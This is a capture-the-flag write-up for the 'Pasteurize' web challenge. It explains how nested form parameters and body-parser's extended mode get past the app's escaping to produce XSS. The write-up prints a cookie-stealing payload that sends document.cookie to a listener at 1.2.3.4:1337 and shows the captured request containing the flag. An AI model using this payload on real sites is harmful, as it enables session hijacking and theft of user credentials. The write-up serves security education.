# <img src="/media/cat_web_icon.svg" width="48" height="48"/> PASTEURIZE

## Prompt

This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?

https://pasteurize.web.ctfcompetition.com/

## Files

* [source.txt](source.txt) - Source code referenced in HTML comment of each paste
* [payload.txt](payload.txt) - Payload used to XSS a paste
* [flag.txt](flag.txt) - Flag retrieved from TJMike🎤's cookie

## Solution

### Understanding The Problem

I started by checking out the website. It seems pretty simple. You can make 'pastes':

<div align="center"><img src="/media/web/pasteurize/pre_paste.png" width="512"></div>

What surprised me right off the bat was that HTML tags work! And there's a share button right there!

<div align="center"><img src="/media/web/pasteurize/post_paste.png" width="512"></div>

This is great! We just throw in `<script>alert(1);</script>` and we have XSS! It couldn't possibly be that easy, right?

Of course it's not that easy. For some reason, `script` tags and `onerror` attributes and every other useful tag/attribute is stripped :(

One *View Page Source* later, all is revealed:

<div align="center"><img src="/media/web/pasteurize/comment.png" width="640"></div>

That's a lot to unpack. The comment here plus the TJMike🎤 button pretty much confirm that XSS is the goal and not SQLi or finding something 'malicious' left by a third party. It also gives us a hint about where to find the source code for this web app: https://pasteurize.web.ctfcompetition.com/source

The first script block is also interesting. It looks like our input string was escaped, but then gets sanitized using `DOMPurify.sanitize(note)`. I hadn't heard of it before, but it seems like a really popular (and unfortunately robust) sanitization tool. There are some DOMPurify exploits, but only for older versions. `DOMPurify.version` in the console showed version `2.0.12`. I also tried escaping the script block before sanitization with double quotes, but those are also escaped...

The second script block will display an additional text box if you pass a `msg` argument. I thought that might be useful to bypass sanitization. So I tried to pass `?msg=<script>alert(1);</script>` to my paste, and that worked, but unfortunately it was all URL encoded...

But now we have a heading! Find some bug in https://pasteurize.web.ctfcompetition.com/source that allows XSS, probably something that's able to escape out of script block #1 before DOMPurify sanitizes it. 

## Bug Hunting

Let's start digging through the source of this app. It's very easy to read, commented even!

The big sections that stood out to me were the escape function:

```
/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

And the GET function:

```
/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});
```

At face value it seems perfectly innocuous. Strings are stored unescaped, then `JSON.stringify()` and the replace functions are used to strip out all of the bad stuff. Totally acceptable way of doing things, right? I spent so many hours trying to figure out how the escape function might be missing a character or some sort of race condition or anything at all, nothing worked. But then I started looking around at other areas of the source. Like the reCAPTCHA stuff. This section caught my eye:

```
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```

Is this a hint that the author didn't know what they were doing when they wrote this? What does this mean? It talks about encodings so I figured at this point it was worth investigating. After some quick googling, found this post: https://stackoverflow.com/a/39779840

> If extended is false, you can not post "nested object"
>
> `person[name] = 'cw'`
>
> `// Nested Object = { person: { name: cw } }>`
>
> If extended is true, you can do whatever way that you like.

At first this didn't seem very useful. I had tried (I thought) to post nested objects by inserting `{x: {y: "z"}`, but quotes were always escaped! Then I realized that I hadn't ever really looked at what format the data was being posted in. So back to the developer console to see what's going on. 

<div align="center"><img src="/media/web/pasteurize/console_test.png" width="640"></div>

Interesting! If `content=Test` is allowed, maybe if we nest something inside of content it will be allowed too! Something like `content[test]=Test` At this point I would normally get out Burp to start editing requests, but I discovered that Firefox has an *Edit and Resend* option if you right-click on a request! 

<div align="center"><img src="/media/web/pasteurize/malformed.png" width="640"></div>

What I expected to see was either no response, an error, or normally displayed content. Instead, I got a new paste with no content! This seemed like a really good sign. I checked out that first script block to see what it looked like and was relieved to see this beauty:

<div align="center"><img src="/media/web/pasteurize/escaped.png" width="640"></div>

It put additional quotes around our nested `test` object and didn't escape them!!! This is perfect!!! Escaping at the top of the script block means we have total control over everything that happens.

## Forming A Payload

Usually in challenges like these, the goal is to steal another user's cookie, in this case TJMike🎤. The way I am most familiar with is to append `document.cookie` to an image request: `<img src=http:"//1.2.3.4:1337?c="+document.cookie>`. Here's the game plan:

1. Cleanly escape the script block quotes to prevent errors, starting with a semi-colon should do the job
2. Create an image tag by setting `innerHTML` of the `note-content` object
3. Set the `src` of the new image to a server we control with the cookie appended
4. `exit()` the script block to prevent anything else from executing. 

Double quotes are still escaped, so we have to use single quotes. The `+` sign also needs to be encoded for this to work correctly. 

```
content[;document.getElementById('note-content').innerHTML='<img src=http://1.2.3.4:1337?c='%2bdocument.cookie%2b'>';exit();//]=pwnd
```

That's it! Run netcat on the listening box, summon TJMike🎤, and get the flag:

```
$ nc -lvnp 1337
Connection from 104.155.55.51:40640
GET /?c=secret=CTF{Express_t0_Tr0ubl3s}
Pragma: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept-Encoding: gzip, deflate
Host: 1.2.3.4:1337
Via: 1.1 infra-squid (squid/3.5.27)
X-Forwarded-For: 34.78.209.239
Cache-Control: no-cache
Connection:keep-alive
```

<div align="center"><img src="/media/flag_submitted_compressed.gif"></div>

## Resources

* Stack Overflow - Extended Body Parser: https://stackoverflow.com/a/39779840
